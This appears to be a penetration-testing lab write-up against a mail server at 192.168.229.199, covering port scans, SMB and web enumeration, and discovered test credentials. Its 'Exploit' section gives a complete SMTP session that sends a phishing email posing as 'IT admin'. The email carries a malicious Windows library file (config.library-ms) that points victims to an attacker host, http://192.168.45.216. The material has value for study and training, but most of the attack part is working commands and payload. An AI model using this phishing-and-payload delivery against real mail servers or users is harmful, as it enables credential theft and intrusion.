`192.168.229.199`
# nmap
```
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: completed IMAP4 QUOTA NAMESPACE CHILDREN IDLE IMAP4rev1 OK RIGHTS=texkA0001 SORT CAPABILITY ACL
445/tcp open  microsoft-ds?
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
```

# smb
#smb_enum #smb
## smbclient
#smbclient 
```sh
$ smbclient -L //192.168.229.199                              
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED
```
## nbtscan
#nbtscan 
```
$ nbtscan 192.168.229.199
Doing NBT name scan for addresses from 192.168.191.199

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
```
## smbmap
#smbmap
```
$ smbmap -H 192.168.229.199  

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)         
```

## net view
#windows #smb_enum #smb #enum 
```
net view \\<ip> /all
```
# ffuf
```
$ ffuf -u "http://192.168.229.199/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .pdf,.txt

                        [Status: 200, Size: 705, Words: 27, Lines: 33, Duration: 510ms]
info.pdf                [Status: 200, Size: 676858, Words: 1, Lines: 1, Duration: 274ms]
```

# http
```
test@supermagicorg.com
user: test
pass: test

first.last@supermagicorg.com
```
![[Pasted image 20231229111353.png]]

# wfuzz
#wfuzz #subdomain #subdomain_enum #enum
```
$ wfuzz -c -f sub-fighter -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://supermagicorg.com' -H "HOST: FUZZ.<domain_name>" --hw <wordcount_to_exclude>

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================


Total time: 155.9581
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 31.98934
```

# smtp
#smtp #telnet 
## reference
[blog post](https://dustyhoppe.wordpress.com/2012/05/22/sending-email-attachments-using-smtp-commands-and-telnet/)
[linux email clients](https://www.tecmint.com/linux-desktop-email-clients/)

interact with smtp server:
**telnet**: `telnet supermagicorg.com 25`
**netcat**: `nc supermagicorg.com 25 -C`
	- `-C` sets the newline to be `\r\n`

user: `$ echo -n 'test@supermagicorg.com' | base64`
	- `dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==`
pass: `$ echo -n 'test' | base64`
	- `dGVzdA==`

## Exploit
Connect to SMTP server `nc supermagicorg.com 25 -C`
paste the following commands to send an email with an xml attachment named `config.library-ms`
```
ehlo supermagicorg.com
auth login
dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==
dGVzdA==
MAIL FROM: test@supermagicorg.com
RCPT TO: test@supermagicorg.com
DATA
Subject: pending configuration
From: IT admin
Content-Type: application/xml;name="will-not-appear-in-email"
Content-Disposition: attachment;filename="config.library-ms"

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>8</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
              <url>http://192.168.45.216</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

.

```


###  SMTP commands and responses:
```smtp
help
211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
#################################################
ehlo supermagicorg.com
250-ADMIN
250-SIZE 20480000
250-AUTH LOGIN
250 HELP
#################################################
auth login
334 VXNlcm5hbWU6
dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==
334 UGFzc3dvcmQ6
dGVzdA==
235 authenticated.
#################################################
MAIL FROM: test@supermagicorg.com
RCPT TO: test@supermagicorg.com
DATA
Subject: pending configuration
Content-Type: application/xml;name="config.library-ms"
Content-Disposition: attachment;filename="config.library-ms"

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>8</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
              <url>http://192.168.45.216</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

.

```
